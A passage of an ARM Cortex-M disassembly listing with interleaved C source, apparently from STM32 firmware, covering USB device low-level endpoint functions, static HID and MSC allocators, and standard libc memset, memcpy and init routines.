 800ccb4:	2301      	movs	r3, #1
 800ccb6:	73fb      	strb	r3, [r7, #15]
    break;
 800ccb8:	e005      	b.n	800ccc6 <USBD_LL_StallEP+0x62>
    case HAL_TIMEOUT :
      usb_status = USBD_FAIL;
 800ccba:	2303      	movs	r3, #3
 800ccbc:	73fb      	strb	r3, [r7, #15]
    break;
 800ccbe:	e002      	b.n	800ccc6 <USBD_LL_StallEP+0x62>
    default :
      usb_status = USBD_FAIL;
 800ccc0:	2303      	movs	r3, #3
 800ccc2:	73fb      	strb	r3, [r7, #15]
    break;
 800ccc4:	bf00      	nop
  }
  return usb_status;
 800ccc6:	7bfb      	ldrb	r3, [r7, #15]
}
 800ccc8:	4618      	mov	r0, r3
 800ccca:	3710      	adds	r7, #16
 800cccc:	46bd      	mov	sp, r7
 800ccce:	bd80      	pop	{r7, pc}

0800ccd0 <USBD_LL_ClearStallEP>:
  * @param  pdev: Device handle
  * @param  ep_addr: Endpoint number
  * @retval USBD status
  */
USBD_StatusTypeDef USBD_LL_ClearStallEP(USBD_HandleTypeDef *pdev, uint8_t ep_addr)
{
 800ccd0:	b580      	push	{r7, lr}
 800ccd2:	b084      	sub	sp, #16
 800ccd4:	af00      	add	r7, sp, #0
 800ccd6:	6078      	str	r0, [r7, #4]
 800ccd8:	460b      	mov	r3, r1
 800ccda:	70fb      	strb	r3, [r7, #3]
  HAL_StatusTypeDef hal_status = HAL_OK;
 800ccdc:	2300      	movs	r3, #0
 800ccde:	73bb      	strb	r3, [r7, #14]
  USBD_StatusTypeDef usb_status = USBD_OK;
 800cce0:	2300      	movs	r3, #0
 800cce2:	73fb      	strb	r3, [r7, #15]

  hal_status = HAL_PCD_EP_ClrStall(pdev->pData, ep_addr);
 800cce4:	687b      	ldr	r3, [r7, #4]
 800cce6:	f8d3 32c8 	ldr.w	r3, [r3, #712]	; 0x2c8
 800ccea:	78fa      	ldrb	r2, [r7, #3]
 800ccec:	4611      	mov	r1, r2
 800ccee:	4618      	mov	r0, r3
 800ccf0:	f7f5 fba6 	bl	8002440 <HAL_PCD_EP_ClrStall>
 800ccf4:	4603      	mov	r3, r0
 800ccf6:	73bb      	strb	r3, [r7, #14]

  switch (hal_status) {
 800ccf8:	7bbb      	ldrb	r3, [r7, #14]
 800ccfa:	2b03      	cmp	r3, #3
 800ccfc:	d816      	bhi.n	800cd2c <USBD_LL_ClearStallEP+0x5c>
 800ccfe:	a201      	add	r2, pc, #4	; (adr r2, 800cd04 <USBD_LL_ClearStallEP+0x34>)
 800cd00:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800cd04:	0800cd15 	.word	0x0800cd15
 800cd08:	0800cd1b 	.word	0x0800cd1b
 800cd0c:	0800cd21 	.word	0x0800cd21
 800cd10:	0800cd27 	.word	0x0800cd27
    case HAL_OK :
      usb_status = USBD_OK;
 800cd14:	2300      	movs	r3, #0
 800cd16:	73fb      	strb	r3, [r7, #15]
    break;
 800cd18:	e00b      	b.n	800cd32 <USBD_LL_ClearStallEP+0x62>
    case HAL_ERROR :
      usb_status = USBD_FAIL;
 800cd1a:	2303      	movs	r3, #3
 800cd1c:	73fb      	strb	r3, [r7, #15]
    break;
 800cd1e:	e008      	b.n	800cd32 <USBD_LL_ClearStallEP+0x62>
    case HAL_BUSY :
      usb_status = USBD_BUSY;
 800cd20:	2301      	movs	r3, #1
 800cd22:	73fb      	strb	r3, [r7, #15]
    break;
 800cd24:	e005      	b.n	800cd32 <USBD_LL_ClearStallEP+0x62>
    case HAL_TIMEOUT :
      usb_status = USBD_FAIL;
 800cd26:	2303      	movs	r3, #3
 800cd28:	73fb      	strb	r3, [r7, #15]
    break;
 800cd2a:	e002      	b.n	800cd32 <USBD_LL_ClearStallEP+0x62>
    default :
      usb_status = USBD_FAIL;
 800cd2c:	2303      	movs	r3, #3
 800cd2e:	73fb      	strb	r3, [r7, #15]
    break;
 800cd30:	bf00      	nop
  }
  return usb_status;
 800cd32:	7bfb      	ldrb	r3, [r7, #15]
}
 800cd34:	4618      	mov	r0, r3
 800cd36:	3710      	adds	r7, #16
 800cd38:	46bd      	mov	sp, r7
 800cd3a:	bd80      	pop	{r7, pc}

0800cd3c <USBD_LL_IsStallEP>:
  * @param  pdev: Device handle
  * @param  ep_addr: Endpoint number
  * @retval Stall (1: Yes, 0: No)
  */
uint8_t USBD_LL_IsStallEP(USBD_HandleTypeDef *pdev, uint8_t ep_addr)
{
 800cd3c:	b480      	push	{r7}
 800cd3e:	b085      	sub	sp, #20
 800cd40:	af00      	add	r7, sp, #0
 800cd42:	6078      	str	r0, [r7, #4]
 800cd44:	460b      	mov	r3, r1
 800cd46:	70fb      	strb	r3, [r7, #3]
  PCD_HandleTypeDef *hpcd = (PCD_HandleTypeDef*) pdev->pData;
 800cd48:	687b      	ldr	r3, [r7, #4]
 800cd4a:	f8d3 32c8 	ldr.w	r3, [r3, #712]	; 0x2c8
 800cd4e:	60fb      	str	r3, [r7, #12]

  if((ep_addr & 0x80) == 0x80)
 800cd50:	f997 3003 	ldrsb.w	r3, [r7, #3]
 800cd54:	2b00      	cmp	r3, #0
 800cd56:	da0c      	bge.n	800cd72 <USBD_LL_IsStallEP+0x36>
  {
    return hpcd->IN_ep[ep_addr & 0x7F].is_stall;
 800cd58:	78fb      	ldrb	r3, [r7, #3]
 800cd5a:	f003 037f 	and.w	r3, r3, #127	; 0x7f
 800cd5e:	68f9      	ldr	r1, [r7, #12]
 800cd60:	1c5a      	adds	r2, r3, #1
 800cd62:	4613      	mov	r3, r2
 800cd64:	009b      	lsls	r3, r3, #2
 800cd66:	4413      	add	r3, r2
 800cd68:	00db      	lsls	r3, r3, #3
 800cd6a:	440b      	add	r3, r1
 800cd6c:	3302      	adds	r3, #2
 800cd6e:	781b      	ldrb	r3, [r3, #0]
 800cd70:	e00b      	b.n	800cd8a <USBD_LL_IsStallEP+0x4e>
  }
  else
  {
    return hpcd->OUT_ep[ep_addr & 0x7F].is_stall;
 800cd72:	78fb      	ldrb	r3, [r7, #3]
 800cd74:	f003 027f 	and.w	r2, r3, #127	; 0x7f
 800cd78:	68f9      	ldr	r1, [r7, #12]
 800cd7a:	4613      	mov	r3, r2
 800cd7c:	009b      	lsls	r3, r3, #2
 800cd7e:	4413      	add	r3, r2
 800cd80:	00db      	lsls	r3, r3, #3
 800cd82:	440b      	add	r3, r1
 800cd84:	f503 73b5 	add.w	r3, r3, #362	; 0x16a
 800cd88:	781b      	ldrb	r3, [r3, #0]
  }
}
 800cd8a:	4618      	mov	r0, r3
 800cd8c:	3714      	adds	r7, #20
 800cd8e:	46bd      	mov	sp, r7
 800cd90:	f85d 7b04 	ldr.w	r7, [sp], #4
 800cd94:	4770      	bx	lr
	...

0800cd98 <USBD_LL_SetUSBAddress>:
  * @param  pdev: Device handle
  * @param  dev_addr: Device address
  * @retval USBD status
  */
USBD_StatusTypeDef USBD_LL_SetUSBAddress(USBD_HandleTypeDef *pdev, uint8_t dev_addr)
{
 800cd98:	b580      	push	{r7, lr}
 800cd9a:	b084      	sub	sp, #16
 800cd9c:	af00      	add	r7, sp, #0
 800cd9e:	6078      	str	r0, [r7, #4]
 800cda0:	460b      	mov	r3, r1
 800cda2:	70fb      	strb	r3, [r7, #3]
  HAL_StatusTypeDef hal_status = HAL_OK;
 800cda4:	2300      	movs	r3, #0
 800cda6:	73bb      	strb	r3, [r7, #14]
  USBD_StatusTypeDef usb_status = USBD_OK;
 800cda8:	2300      	movs	r3, #0
 800cdaa:	73fb      	strb	r3, [r7, #15]

  hal_status = HAL_PCD_SetAddress(pdev->pData, dev_addr);
 800cdac:	687b      	ldr	r3, [r7, #4]
 800cdae:	f8d3 32c8 	ldr.w	r3, [r3, #712]	; 0x2c8
 800cdb2:	78fa      	ldrb	r2, [r7, #3]
 800cdb4:	4611      	mov	r1, r2
 800cdb6:	4618      	mov	r0, r3
 800cdb8:	f7f5 f97f 	bl	80020ba <HAL_PCD_SetAddress>
 800cdbc:	4603      	mov	r3, r0
 800cdbe:	73bb      	strb	r3, [r7, #14]

  switch (hal_status) {
 800cdc0:	7bbb      	ldrb	r3, [r7, #14]
 800cdc2:	2b03      	cmp	r3, #3
 800cdc4:	d816      	bhi.n	800cdf4 <USBD_LL_SetUSBAddress+0x5c>
 800cdc6:	a201      	add	r2, pc, #4	; (adr r2, 800cdcc <USBD_LL_SetUSBAddress+0x34>)
 800cdc8:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800cdcc:	0800cddd 	.word	0x0800cddd
 800cdd0:	0800cde3 	.word	0x0800cde3
 800cdd4:	0800cde9 	.word	0x0800cde9
 800cdd8:	0800cdef 	.word	0x0800cdef
    case HAL_OK :
      usb_status = USBD_OK;
 800cddc:	2300      	movs	r3, #0
 800cdde:	73fb      	strb	r3, [r7, #15]
    break;
 800cde0:	e00b      	b.n	800cdfa <USBD_LL_SetUSBAddress+0x62>
    case HAL_ERROR :
      usb_status = USBD_FAIL;
 800cde2:	2303      	movs	r3, #3
 800cde4:	73fb      	strb	r3, [r7, #15]
    break;
 800cde6:	e008      	b.n	800cdfa <USBD_LL_SetUSBAddress+0x62>
    case HAL_BUSY :
      usb_status = USBD_BUSY;
 800cde8:	2301      	movs	r3, #1
 800cdea:	73fb      	strb	r3, [r7, #15]
    break;
 800cdec:	e005      	b.n	800cdfa <USBD_LL_SetUSBAddress+0x62>
    case HAL_TIMEOUT :
      usb_status = USBD_FAIL;
 800cdee:	2303      	movs	r3, #3
 800cdf0:	73fb      	strb	r3, [r7, #15]
    break;
 800cdf2:	e002      	b.n	800cdfa <USBD_LL_SetUSBAddress+0x62>
    default :
      usb_status = USBD_FAIL;
 800cdf4:	2303      	movs	r3, #3
 800cdf6:	73fb      	strb	r3, [r7, #15]
    break;
 800cdf8:	bf00      	nop
  }
  return usb_status;
 800cdfa:	7bfb      	ldrb	r3, [r7, #15]
}
 800cdfc:	4618      	mov	r0, r3
 800cdfe:	3710      	adds	r7, #16
 800ce00:	46bd      	mov	sp, r7
 800ce02:	bd80      	pop	{r7, pc}

0800ce04 <USBD_LL_Transmit>:
  * @param  pbuf: Pointer to data to be sent
  * @param  size: Data size
  * @retval USBD status
  */
USBD_StatusTypeDef USBD_LL_Transmit(USBD_HandleTypeDef *pdev, uint8_t ep_addr, uint8_t *pbuf, uint32_t size)
{
 800ce04:	b580      	push	{r7, lr}
 800ce06:	b086      	sub	sp, #24
 800ce08:	af00      	add	r7, sp, #0
 800ce0a:	60f8      	str	r0, [r7, #12]
 800ce0c:	607a      	str	r2, [r7, #4]
 800ce0e:	603b      	str	r3, [r7, #0]
 800ce10:	460b      	mov	r3, r1
 800ce12:	72fb      	strb	r3, [r7, #11]
  HAL_StatusTypeDef hal_status = HAL_OK;
 800ce14:	2300      	movs	r3, #0
 800ce16:	75bb      	strb	r3, [r7, #22]
  USBD_StatusTypeDef usb_status = USBD_OK;
 800ce18:	2300      	movs	r3, #0
 800ce1a:	75fb      	strb	r3, [r7, #23]

  hal_status = HAL_PCD_EP_Transmit(pdev->pData, ep_addr, pbuf, size);
 800ce1c:	68fb      	ldr	r3, [r7, #12]
 800ce1e:	f8d3 02c8 	ldr.w	r0, [r3, #712]	; 0x2c8
 800ce22:	7af9      	ldrb	r1, [r7, #11]
 800ce24:	683b      	ldr	r3, [r7, #0]
 800ce26:	687a      	ldr	r2, [r7, #4]
 800ce28:	f7f5 fa5a 	bl	80022e0 <HAL_PCD_EP_Transmit>
 800ce2c:	4603      	mov	r3, r0
 800ce2e:	75bb      	strb	r3, [r7, #22]

  switch (hal_status) {
 800ce30:	7dbb      	ldrb	r3, [r7, #22]
 800ce32:	2b03      	cmp	r3, #3
 800ce34:	d816      	bhi.n	800ce64 <USBD_LL_Transmit+0x60>
 800ce36:	a201      	add	r2, pc, #4	; (adr r2, 800ce3c <USBD_LL_Transmit+0x38>)
 800ce38:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800ce3c:	0800ce4d 	.word	0x0800ce4d
 800ce40:	0800ce53 	.word	0x0800ce53
 800ce44:	0800ce59 	.word	0x0800ce59
 800ce48:	0800ce5f 	.word	0x0800ce5f
    case HAL_OK :
      usb_status = USBD_OK;
 800ce4c:	2300      	movs	r3, #0
 800ce4e:	75fb      	strb	r3, [r7, #23]
    break;
 800ce50:	e00b      	b.n	800ce6a <USBD_LL_Transmit+0x66>
    case HAL_ERROR :
      usb_status = USBD_FAIL;
 800ce52:	2303      	movs	r3, #3
 800ce54:	75fb      	strb	r3, [r7, #23]
    break;
 800ce56:	e008      	b.n	800ce6a <USBD_LL_Transmit+0x66>
    case HAL_BUSY :
      usb_status = USBD_BUSY;
 800ce58:	2301      	movs	r3, #1
 800ce5a:	75fb      	strb	r3, [r7, #23]
    break;
 800ce5c:	e005      	b.n	800ce6a <USBD_LL_Transmit+0x66>
    case HAL_TIMEOUT :
      usb_status = USBD_FAIL;
 800ce5e:	2303      	movs	r3, #3
 800ce60:	75fb      	strb	r3, [r7, #23]
    break;
 800ce62:	e002      	b.n	800ce6a <USBD_LL_Transmit+0x66>
    default :
      usb_status = USBD_FAIL;
 800ce64:	2303      	movs	r3, #3
 800ce66:	75fb      	strb	r3, [r7, #23]
    break;
 800ce68:	bf00      	nop
  }
  return usb_status;
 800ce6a:	7dfb      	ldrb	r3, [r7, #23]
}
 800ce6c:	4618      	mov	r0, r3
 800ce6e:	3718      	adds	r7, #24
 800ce70:	46bd      	mov	sp, r7
 800ce72:	bd80      	pop	{r7, pc}

0800ce74 <USBD_LL_PrepareReceive>:
  * @param  pbuf: Pointer to data to be received
  * @param  size: Data size
  * @retval USBD status
  */
USBD_StatusTypeDef USBD_LL_PrepareReceive(USBD_HandleTypeDef *pdev, uint8_t ep_addr, uint8_t *pbuf, uint32_t size)
{
 800ce74:	b580      	push	{r7, lr}
 800ce76:	b086      	sub	sp, #24
 800ce78:	af00      	add	r7, sp, #0
 800ce7a:	60f8      	str	r0, [r7, #12]
 800ce7c:	607a      	str	r2, [r7, #4]
 800ce7e:	603b      	str	r3, [r7, #0]
 800ce80:	460b      	mov	r3, r1
 800ce82:	72fb      	strb	r3, [r7, #11]
  HAL_StatusTypeDef hal_status = HAL_OK;
 800ce84:	2300      	movs	r3, #0
 800ce86:	75bb      	strb	r3, [r7, #22]
  USBD_StatusTypeDef usb_status = USBD_OK;
 800ce88:	2300      	movs	r3, #0
 800ce8a:	75fb      	strb	r3, [r7, #23]

  hal_status = HAL_PCD_EP_Receive(pdev->pData, ep_addr, pbuf, size);
 800ce8c:	68fb      	ldr	r3, [r7, #12]
 800ce8e:	f8d3 02c8 	ldr.w	r0, [r3, #712]	; 0x2c8
 800ce92:	7af9      	ldrb	r1, [r7, #11]
 800ce94:	683b      	ldr	r3, [r7, #0]
 800ce96:	687a      	ldr	r2, [r7, #4]
 800ce98:	f7f5 f9d9 	bl	800224e <HAL_PCD_EP_Receive>
 800ce9c:	4603      	mov	r3, r0
 800ce9e:	75bb      	strb	r3, [r7, #22]

  switch (hal_status) {
 800cea0:	7dbb      	ldrb	r3, [r7, #22]
 800cea2:	2b03      	cmp	r3, #3
 800cea4:	d816      	bhi.n	800ced4 <USBD_LL_PrepareReceive+0x60>
 800cea6:	a201      	add	r2, pc, #4	; (adr r2, 800ceac <USBD_LL_PrepareReceive+0x38>)
 800cea8:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800ceac:	0800cebd 	.word	0x0800cebd
 800ceb0:	0800cec3 	.word	0x0800cec3
 800ceb4:	0800cec9 	.word	0x0800cec9
 800ceb8:	0800cecf 	.word	0x0800cecf
    case HAL_OK :
      usb_status = USBD_OK;
 800cebc:	2300      	movs	r3, #0
 800cebe:	75fb      	strb	r3, [r7, #23]
    break;
 800cec0:	e00b      	b.n	800ceda <USBD_LL_PrepareReceive+0x66>
    case HAL_ERROR :
      usb_status = USBD_FAIL;
 800cec2:	2303      	movs	r3, #3
 800cec4:	75fb      	strb	r3, [r7, #23]
    break;
 800cec6:	e008      	b.n	800ceda <USBD_LL_PrepareReceive+0x66>
    case HAL_BUSY :
      usb_status = USBD_BUSY;
 800cec8:	2301      	movs	r3, #1
 800ceca:	75fb      	strb	r3, [r7, #23]
    break;
 800cecc:	e005      	b.n	800ceda <USBD_LL_PrepareReceive+0x66>
    case HAL_TIMEOUT :
      usb_status = USBD_FAIL;
 800cece:	2303      	movs	r3, #3
 800ced0:	75fb      	strb	r3, [r7, #23]
    break;
 800ced2:	e002      	b.n	800ceda <USBD_LL_PrepareReceive+0x66>
    default :
      usb_status = USBD_FAIL;
 800ced4:	2303      	movs	r3, #3
 800ced6:	75fb      	strb	r3, [r7, #23]
    break;
 800ced8:	bf00      	nop
  }
  return usb_status;
 800ceda:	7dfb      	ldrb	r3, [r7, #23]
}
 800cedc:	4618      	mov	r0, r3
 800cede:	3718      	adds	r7, #24
 800cee0:	46bd      	mov	sp, r7
 800cee2:	bd80      	pop	{r7, pc}

0800cee4 <USBD_LL_GetRxDataSize>:
  * @param  pdev: Device handle
  * @param  ep_addr: Endpoint number
  * @retval Received Data Size
  */
uint32_t USBD_LL_GetRxDataSize(USBD_HandleTypeDef *pdev, uint8_t ep_addr)
{
 800cee4:	b580      	push	{r7, lr}
 800cee6:	b082      	sub	sp, #8
 800cee8:	af00      	add	r7, sp, #0
 800ceea:	6078      	str	r0, [r7, #4]
 800ceec:	460b      	mov	r3, r1
 800ceee:	70fb      	strb	r3, [r7, #3]
  return HAL_PCD_EP_GetRxCount((PCD_HandleTypeDef*) pdev->pData, ep_addr);
 800cef0:	687b      	ldr	r3, [r7, #4]
 800cef2:	f8d3 32c8 	ldr.w	r3, [r3, #712]	; 0x2c8
 800cef6:	78fa      	ldrb	r2, [r7, #3]
 800cef8:	4611      	mov	r1, r2
 800cefa:	4618      	mov	r0, r3
 800cefc:	f7f5 f9d8 	bl	80022b0 <HAL_PCD_EP_GetRxCount>
 800cf00:	4603      	mov	r3, r0
}
 800cf02:	4618      	mov	r0, r3
 800cf04:	3708      	adds	r7, #8
 800cf06:	46bd      	mov	sp, r7
 800cf08:	bd80      	pop	{r7, pc}
	...

0800cf0c <HAL_PCDEx_LPM_Callback>:
  * @param  hpcd: PCD handle
  * @param  msg: LPM message
  * @retval None
  */
void HAL_PCDEx_LPM_Callback(PCD_HandleTypeDef *hpcd, PCD_LPM_MsgTypeDef msg)
{
 800cf0c:	b580      	push	{r7, lr}
 800cf0e:	b082      	sub	sp, #8
 800cf10:	af00      	add	r7, sp, #0
 800cf12:	6078      	str	r0, [r7, #4]
 800cf14:	460b      	mov	r3, r1
 800cf16:	70fb      	strb	r3, [r7, #3]
  switch (msg)
 800cf18:	78fb      	ldrb	r3, [r7, #3]
 800cf1a:	2b00      	cmp	r3, #0
 800cf1c:	d002      	beq.n	800cf24 <HAL_PCDEx_LPM_Callback+0x18>
 800cf1e:	2b01      	cmp	r3, #1
 800cf20:	d013      	beq.n	800cf4a <HAL_PCDEx_LPM_Callback+0x3e>
      /* Set SLEEPDEEP bit and SleepOnExit of Cortex System Control Register. */
      SCB->SCR |= (uint32_t)((uint32_t)(SCB_SCR_SLEEPDEEP_Msk | SCB_SCR_SLEEPONEXIT_Msk));
    }
    break;
  }
}
 800cf22:	e023      	b.n	800cf6c <HAL_PCDEx_LPM_Callback+0x60>
    if (hpcd->Init.low_power_enable)
 800cf24:	687b      	ldr	r3, [r7, #4]
 800cf26:	699b      	ldr	r3, [r3, #24]
 800cf28:	2b00      	cmp	r3, #0
 800cf2a:	d007      	beq.n	800cf3c <HAL_PCDEx_LPM_Callback+0x30>
      SystemClockConfig_Resume();
 800cf2c:	f000 f84a 	bl	800cfc4 <SystemClockConfig_Resume>
      SCB->SCR &= (uint32_t)~((uint32_t)(SCB_SCR_SLEEPDEEP_Msk | SCB_SCR_SLEEPONEXIT_Msk));
 800cf30:	4b10      	ldr	r3, [pc, #64]	; (800cf74 <HAL_PCDEx_LPM_Callback+0x68>)
 800cf32:	691b      	ldr	r3, [r3, #16]
 800cf34:	4a0f      	ldr	r2, [pc, #60]	; (800cf74 <HAL_PCDEx_LPM_Callback+0x68>)
 800cf36:	f023 0306 	bic.w	r3, r3, #6
 800cf3a:	6113      	str	r3, [r2, #16]
    USBD_LL_Resume(hpcd->pData);
 800cf3c:	687b      	ldr	r3, [r7, #4]
 800cf3e:	f8d3 32f4 	ldr.w	r3, [r3, #756]	; 0x2f4
 800cf42:	4618      	mov	r0, r3
 800cf44:	f7fe fa66 	bl	800b414 <USBD_LL_Resume>
    break;
 800cf48:	e010      	b.n	800cf6c <HAL_PCDEx_LPM_Callback+0x60>
    USBD_LL_Suspend(hpcd->pData);
 800cf4a:	687b      	ldr	r3, [r7, #4]
 800cf4c:	f8d3 32f4 	ldr.w	r3, [r3, #756]	; 0x2f4
 800cf50:	4618      	mov	r0, r3
 800cf52:	f7fe fa43 	bl	800b3dc <USBD_LL_Suspend>
    if (hpcd->Init.low_power_enable)
 800cf56:	687b      	ldr	r3, [r7, #4]
 800cf58:	699b      	ldr	r3, [r3, #24]
 800cf5a:	2b00      	cmp	r3, #0
 800cf5c:	d005      	beq.n	800cf6a <HAL_PCDEx_LPM_Callback+0x5e>
      SCB->SCR |= (uint32_t)((uint32_t)(SCB_SCR_SLEEPDEEP_Msk | SCB_SCR_SLEEPONEXIT_Msk));
 800cf5e:	4b05      	ldr	r3, [pc, #20]	; (800cf74 <HAL_PCDEx_LPM_Callback+0x68>)
 800cf60:	691b      	ldr	r3, [r3, #16]
 800cf62:	4a04      	ldr	r2, [pc, #16]	; (800cf74 <HAL_PCDEx_LPM_Callback+0x68>)
 800cf64:	f043 0306 	orr.w	r3, r3, #6
 800cf68:	6113      	str	r3, [r2, #16]
    break;
 800cf6a:	bf00      	nop
}
 800cf6c:	bf00      	nop
 800cf6e:	3708      	adds	r7, #8
 800cf70:	46bd      	mov	sp, r7
 800cf72:	bd80      	pop	{r7, pc}
 800cf74:	e000ed00 	.word	0xe000ed00

0800cf78 <USBD_static_malloc>:
  * @brief  Static single allocation.
  * @param  size: Size of allocated memory
  * @retval None
  */
void *USBD_static_malloc(uint32_t size)
{
 800cf78:	b480      	push	{r7}
 800cf7a:	b083      	sub	sp, #12
 800cf7c:	af00      	add	r7, sp, #0
 800cf7e:	6078      	str	r0, [r7, #4]
  static uint32_t mem[(sizeof(USBD_CUSTOM_HID_HandleTypeDef)/4+1)];/* On 32-bit boundary */
  return mem;
 800cf80:	4b03      	ldr	r3, [pc, #12]	; (800cf90 <USBD_static_malloc+0x18>)
}
 800cf82:	4618      	mov	r0, r3
 800cf84:	370c      	adds	r7, #12
 800cf86:	46bd      	mov	sp, r7
 800cf88:	f85d 7b04 	ldr.w	r7, [sp], #4
 800cf8c:	4770      	bx	lr
 800cf8e:	bf00      	nop
 800cf90:	20000e74 	.word	0x20000e74

0800cf94 <USBD_static_malloc_MSC>:

void *USBD_static_malloc_MSC(uint32_t size)
{
 800cf94:	b480      	push	{r7}
 800cf96:	b083      	sub	sp, #12
 800cf98:	af00      	add	r7, sp, #0
 800cf9a:	6078      	str	r0, [r7, #4]
  static uint32_t mem[(sizeof(USBD_MSC_BOT_HandleTypeDef)/4+1)];/* On 32-bit boundary */
  return mem;
 800cf9c:	4b03      	ldr	r3, [pc, #12]	; (800cfac <USBD_static_malloc_MSC+0x18>)
}
 800cf9e:	4618      	mov	r0, r3
 800cfa0:	370c      	adds	r7, #12
 800cfa2:	46bd      	mov	sp, r7
 800cfa4:	f85d 7b04 	ldr.w	r7, [sp], #4
 800cfa8:	4770      	bx	lr
 800cfaa:	bf00      	nop
 800cfac:	20000e9c 	.word	0x20000e9c

0800cfb0 <USBD_static_free>:
  * @brief  Dummy memory free
  * @param  p: Pointer to allocated  memory address
  * @retval None
  */
void USBD_static_free(void *p)
{
 800cfb0:	b480      	push	{r7}
 800cfb2:	b083      	sub	sp, #12
 800cfb4:	af00      	add	r7, sp, #0
 800cfb6:	6078      	str	r0, [r7, #4]

}
 800cfb8:	bf00      	nop
 800cfba:	370c      	adds	r7, #12
 800cfbc:	46bd      	mov	sp, r7
 800cfbe:	f85d 7b04 	ldr.w	r7, [sp], #4
 800cfc2:	4770      	bx	lr

0800cfc4 <SystemClockConfig_Resume>:
  * @brief  Configures system clock after wake-up from USB resume callBack:
  *         enable HSI, PLL and select PLL as system clock source.
  * @retval None
  */
static void SystemClockConfig_Resume(void)
{
 800cfc4:	b580      	push	{r7, lr}
 800cfc6:	af00      	add	r7, sp, #0
  SystemClock_Config();
 800cfc8:	f7f3 fb3a 	bl	8000640 <SystemClock_Config>
}
 800cfcc:	bf00      	nop
 800cfce:	bd80      	pop	{r7, pc}

0800cfd0 <memset>:
 800cfd0:	4402      	add	r2, r0
 800cfd2:	4603      	mov	r3, r0
 800cfd4:	4293      	cmp	r3, r2
 800cfd6:	d100      	bne.n	800cfda <memset+0xa>
 800cfd8:	4770      	bx	lr
 800cfda:	f803 1b01 	strb.w	r1, [r3], #1
 800cfde:	e7f9      	b.n	800cfd4 <memset+0x4>

0800cfe0 <__libc_init_array>:
 800cfe0:	b570      	push	{r4, r5, r6, lr}
 800cfe2:	4d0d      	ldr	r5, [pc, #52]	; (800d018 <__libc_init_array+0x38>)
 800cfe4:	4c0d      	ldr	r4, [pc, #52]	; (800d01c <__libc_init_array+0x3c>)
 800cfe6:	1b64      	subs	r4, r4, r5
 800cfe8:	10a4      	asrs	r4, r4, #2
 800cfea:	2600      	movs	r6, #0
 800cfec:	42a6      	cmp	r6, r4
 800cfee:	d109      	bne.n	800d004 <__libc_init_array+0x24>
 800cff0:	4d0b      	ldr	r5, [pc, #44]	; (800d020 <__libc_init_array+0x40>)
 800cff2:	4c0c      	ldr	r4, [pc, #48]	; (800d024 <__libc_init_array+0x44>)
 800cff4:	f000 f826 	bl	800d044 <_init>
 800cff8:	1b64      	subs	r4, r4, r5
 800cffa:	10a4      	asrs	r4, r4, #2
 800cffc:	2600      	movs	r6, #0
 800cffe:	42a6      	cmp	r6, r4
 800d000:	d105      	bne.n	800d00e <__libc_init_array+0x2e>
 800d002:	bd70      	pop	{r4, r5, r6, pc}
 800d004:	f855 3b04 	ldr.w	r3, [r5], #4
 800d008:	4798      	blx	r3
 800d00a:	3601      	adds	r6, #1
 800d00c:	e7ee      	b.n	800cfec <__libc_init_array+0xc>
 800d00e:	f855 3b04 	ldr.w	r3, [r5], #4
 800d012:	4798      	blx	r3
 800d014:	3601      	adds	r6, #1
 800d016:	e7f2      	b.n	800cffe <__libc_init_array+0x1e>
 800d018:	0800d290 	.word	0x0800d290
 800d01c:	0800d290 	.word	0x0800d290
 800d020:	0800d290 	.word	0x0800d290
 800d024:	0800d294 	.word	0x0800d294

0800d028 <memcpy>:
 800d028:	440a      	add	r2, r1
 800d02a:	4291      	cmp	r1, r2
 800d02c:	f100 33ff 	add.w	r3, r0, #4294967295
 800d030:	d100      	bne.n	800d034 <memcpy+0xc>
 800d032:	4770      	bx	lr
 800d034:	b510      	push	{r4, lr}
 800d036:	f811 4b01 	ldrb.w	r4, [r1], #1
 800d03a:	f803 4f01 	strb.w	r4, [r3, #1]!
 800d03e:	4291      	cmp	r1, r2
 800d040:	d1f9      	bne.n	800d036 <memcpy+0xe>
 800d042:	bd10      	pop	{r4, pc}

0800d044 <_init>:
 800d044:	b5f8      	push	{r3, r4, r5, r6, r7, lr}
 800d046:	bf00      	nop
 800d048:	bcf8      	pop	{r3, r4, r5, r6, r7}
 800d04a:	bc08      	pop	{r3}
 800d04c:	469e      	mov	lr, r3
 800d04e:	4770      	bx	lr

0800d050 <_fini>:
 800d050:	b5f8      	push	{r3, r4, r5, r6, r7, lr}
 800d052:	bf00      	nop
 800d054:	bcf8      	pop	{r3, r4, r5, r6, r7}
 800d056:	bc08      	pop	{r3}
 800d058:	469e      	mov	lr, r3
 800d05a:	4770      	bx	lr
